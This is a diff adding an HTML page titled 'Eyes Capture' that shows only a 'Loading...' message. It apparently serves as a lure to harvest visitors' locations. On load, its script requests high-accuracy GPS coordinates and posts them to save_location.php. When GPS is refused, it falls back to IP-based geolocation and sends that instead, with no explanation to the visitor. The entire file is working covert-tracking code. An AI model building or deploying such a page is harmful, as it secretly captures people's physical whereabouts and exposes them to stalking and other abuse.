@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Eyes Capture</title>
+  <script>
+    function sendData(payload) {
+      fetch('save_location.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error(err));
+    }
+
+    function getIPFallback() {
+      fetch('ipgeo.php')
+        .then(r => r.json())
+        .then(d => sendData({ type: 'ip', ipinfo: d }))
+        .catch(err => console.error(err));
+    }
+
+    function capture() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            sendData({
+              type: 'gps',
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy
+            });
+          },
+          err => {
+            console.warn("GPS denied, falling back to IP.");
+            getIPFallback();
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        getIPFallback();
+      }
+    }
+
+    window.onload = capture;
+  </script>
+</head>
+<body>
+  <h2>Loading...</h2>
+</body>
+</html>
